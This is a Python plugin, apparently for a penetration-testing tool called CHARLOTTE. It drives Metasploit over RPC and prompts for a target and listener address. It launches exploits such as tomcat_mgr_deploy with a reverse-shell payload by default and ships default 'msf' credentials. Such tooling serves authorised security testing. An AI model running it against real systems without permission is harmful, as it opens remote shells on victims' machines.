# ******************************************************************************************
# metasploit_plugin.py
# CHARLOTTE plugin for interacting with the Metasploit RPC interface.
# Requires msfrpcd to be running with correct username and password.
# Uses the gc-metasploit client wrapper for simplified control.
# ******************************************************************************************

import os
from pprint import pprint

# ==========================================================================================
# ATTEMPT TO IMPORT gc-metasploit Metasploit CLIENT CLASS
# ==========================================================================================
try:
    from gc_metasploit import Metasploit
except ImportError as e:
    import gc_metasploit
    print("[!] Could not import 'Metasploit' from 'gc_metasploit'.")
    print("[!] Available attributes in gc_metasploit:", dir(gc_metasploit))
    raise e
from pprint import pprint

# ==========================================================================================
# CLASS: MetasploitInterface (using gc-metasploit)
# Handles RPC connection and Metasploit interactions for CHARLOTTE
# ==========================================================================================
class MetasploitInterface:
    def __init__(self, username='msf', password='msf', ssl=False, port=55553, host='127.0.0.1'):
        try:
            self.client = Metasploit(
                password=password,
                username=username,
                ssl=ssl,
                port=port,
                host=host
            )
            print("[+] Connected to Metasploit RPC via gc-metasploit.")
        except Exception as e:
            print(f"[!] Failed to connect to Metasploit RPC: {e}")
            self.client = None

    # ======================================================================================
    # FUNCTION: search_module()
    # Searches for modules matching a keyword
    # ======================================================================================
    def search_module(self, keyword):
        if self.client:
            return self.client.search(keyword)
        return []

    # ======================================================================================
    # FUNCTION: list_exploits()
    # Lists all available exploit modules
    # ======================================================================================
    def list_exploits(self):
        if self.client:
            return self.client.list_exploits()
        return []

    # ======================================================================================
    # FUNCTION: run_exploit()
    # Launches a selected Metasploit exploit with basic RHOST/LHOST settings
    # ======================================================================================
    def run_exploit(self, exploit_path, payload="generic/shell_reverse_tcp", rhost="", lhost="127.0.0.1", lport="4444"):
        if self.client:
            result = self.client.run_exploit(
                exploit_path,
                payload=payload,
                rhost=rhost,
                lhost=lhost,
                lport=lport
            )
            print(f"[+] Exploit {exploit_path} launched with {payload}")
            print(result)
        else:
            print("[!] Metasploit RPC client is not connected.")

# ==========================================================================================
# MAIN
# Standalone CLI entry for running this plugin independently
# ==========================================================================================
if __name__ == "__main__":
    msf = MetasploitInterface()

    # List top 10 available exploits
    print("\n[+] Available Exploits:")
    exploits = msf.list_exploits()
    for e in exploits[:10]:
        print(f" - {e}")

    # Search Metasploit modules using keyword
    print("\n[+] Search for 'tomcat':")
    pprint(msf.search_module("tomcat"))

    # Prompting for exploit execution
    print("\n[+] Running example exploit (make sure Metasploit is configured):")

    # Prompt user for input or use defaults
    exploit_path = input("Which exploit would you like to run? (e.g., multi/http/tomcat_mgr_deploy): ").strip()
    if not exploit_path:
        exploit_path = "multi/http/tomcat_mgr_deploy"

    rhost = input("Enter RHOST (target IP): ").strip()
    if not rhost:
        rhost = "127.0.0.1"

    lhost = input("Enter LHOST (local IP for reverse shell): ").strip()
    if not lhost:
        lhost = "127.0.0.1"

    lport = input("Enter LPORT (local port for reverse shell): ").strip()
    if not lport:
        lport = "4444"

    # Pre-checks before launching
    if not msf.client:
        print("[!] Metasploit client is not connected. Cannot run exploit.")
        exit(1)

    if not exploit_path:
        print("[!] No exploit path provided. Cannot run exploit.")
        exit(1)

    print(f"[+] Running exploit: {exploit_path}")
    msf.run_exploit(exploit_path, rhost=rhost, lhost=lhost, lport=lport)

    # Optional example for static execution
    # msf.run_exploit("windows/smb/ms08_067_netapi", rhost="192.168.1.105")

    print("[*] Metasploit interaction complete.")
    print("[*] Remember to check the Metasploit console for detailed output.")
# ==========================================================================================
# END OF METASPLOIT PLUGIN